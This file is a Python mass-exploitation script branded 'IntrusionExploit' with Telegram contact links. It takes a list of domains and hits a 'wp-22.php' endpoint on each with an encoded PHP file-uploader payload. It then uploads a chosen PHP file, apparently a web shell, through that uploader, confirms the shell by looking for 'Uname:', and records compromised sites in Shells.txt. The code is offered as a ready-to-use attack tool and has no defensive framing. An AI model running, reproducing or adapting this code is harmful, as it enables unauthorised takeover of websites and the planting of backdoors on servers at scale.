import os
import ctypes
import sys
import requests
import threading
import colorama
import random
import string 
from colorama import Fore, Style, init

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

print ("""
 ___       _                  _             _____            _       _ _   
|_ _|_ __ | |_ _ __ _   _ ___(_) ___  _ __ | ____|_  ___ __ | | ___ (_) |_ 
 | || '_ \| __| '__| | | / __| |/ _ \| '_ \|  _| \ \/ / '_ \| |/ _ \| | __|
 | || | | | |_| |  | |_| \__ \ | (_) | | | | |___ >  <| |_) | | (_) | | |_ 
|___|_| |_|\__|_|   \__,_|___/_|\___/|_| |_|_____/_/\_\ .__/|_|\___/|_|\__|
                                                      |_|https://t.me/IntrusionExploit
""")


select = input("File upload : ")

def random_generator(size):
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return ''.join(random.choice(chars) for _ in range(size))

code = """%3C?php%20echo%20%27https%3A%2F%2Ft.me%2Fxeonthread%20Uploader%3Cbr%3E%27;echo%20%27%3Cbr%3E%27;echo%20%27%3Cform%20action=%22%22%20method=%22post%22%20enctype=%22multipart/form-data%22%20name=%22uploader%22%20id=%22uploader%22%3E%27;echo%20%27%3Cinput%20type=%22file%22%20name=%22file%22%20size=%2250%22%3E%3Cinput%20name=%22_upl%22%20type=%22submit%22%20id=%22_upl%22%20value=%22Upload%22%3E%20%3C/form%3E%27;if(%20$_POST[%27_upl%27]%20==%20%22Upload%22%20)%20{if(@copy($_FILES[%27file%27][%27tmp_name%27],%20$_FILES[%27file%27][%27name%27]))%20{%20echo%20%27%3Cb%3EUpload%20!!!%3C/b%3E%3Cbr%3E%3Cbr%3E%27;%20}else%20{%20echo%20%27%3Cb%3EUpload%20!!!%3C/b%3E%3Cbr%3E%3Cbr%3E%27;}}?%3E"""


def read_file(filename):
    with open(filename, 'rb') as file:
        return file.read()



def post1(url):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36'}

        global fileup
        filenames = 'IntrusionExploit' + random_generator(6) + ".php"
        content_files = read_file(select)
        check = requests.get(url, verify=False, headers=headers)

        form_data = {
            "_upl": "Upload",
        }

        if 'Uploader' in check.text:
            fileup = {'file': (filenames, content_files, 'application/x-php')}
        else:
            fileup = {'up': ('IntrusionExploit.php', open('IntrusionExploit.php', 'rb'))}

        up = requests.post(url, files=fileup , data=form_data , headers=headers, verify=False, timeout=60)
        s = os.path.dirname(url) + '/' + filenames
        shell = requests.get(s, verify=False, headers=headers)
        
        

        if 'Uname:' in shell.text:  # check scripts
            #sys.stdout.write(s + ' --------> deliver !!\n\a')
            with open('Shells.txt', 'a') as ww:
                ww.write(s + '\n')
        else:
            #print(url + ' ----> failed.')
            with open('Shells.txt', 'a') as ww:
                ww.write(url + '\n')

    except Exception as e:
        print(e)


def check_url(url):
    try:
        filename = "IntrusionExploit" + random_generator(5) + ".php"
        response = requests.get(
            url + f'/wp-22.php?sfilename={filename}&sfilecontent={code}&supfiles={filename}',
            headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36'},
        )
        if response.status_code == 200 and 'phpsuccess' in response.text:
            post1(url+ f"/{filename}")
            print(f"{Fore.GREEN}[+] - {url} - success{Style.RESET_ALL} Good")

        else:
            print(f"{Fore.RED}[-] - {url} - Sad{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] - Error checking {url}{Style.RESET_ALL}")

def main():
    colorama.init(autoreset=True)
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    file_path = input("List : ")
    
    with open(file_path, 'r', encoding='latin-1') as file:
        domains = file.readlines()

    threads = []
    for domain in domains:
        domain = domain.strip()
        if not domain.startswith('http://') and not domain.startswith('https://'):
            domain = 'http://' + domain

        thread = threading.Thread(target=check_url, args=(domain,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
